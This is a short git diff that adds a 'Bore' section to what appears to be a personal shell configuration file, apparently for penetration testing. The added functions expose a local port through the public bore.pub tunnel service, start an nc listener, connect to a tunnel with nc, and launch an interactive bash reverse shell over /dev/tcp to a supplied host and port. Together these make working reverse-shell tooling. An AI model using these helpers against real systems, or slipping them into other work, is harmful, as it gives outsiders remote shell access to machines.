@@ -194,3 +194,38 @@ fi
 ## Alias
 export PATH="$HOME/vpn/bin:$PATH"
 alias hosts='cat /etc/hosts'
+
+# ---------- Bore ----------
+
+# Expose a local port through bore
+# Usage:
+#   borehost 4444
+#   borehost 8080 9000   # local_port remote_port
+borehost() {
+    local lport="$1"
+    local rport="${2:-$1}"
+
+    bore local "$lport" --to bore.pub --port "$rport"
+}
+
+# Connect to someone else's Bore tunnel
+# Usage:
+#   borejoin bore.pub 4444
+#   borejoin 159.223.110.159 4444
+borejoin() {
+    nc "$1" "$2"
+}
+
+# Bash reverse shell through Bore
+# Usage:
+#   borebash bore.pub 4444
+borebash() {
+    bash -c "bash -i >& /dev/tcp/$1/$2 0>&1"
+}
+
+# Simple listener
+# Usage:
+#   borelisten 4444
+borelisten() {
+    nc -lvnp "$1"
+}
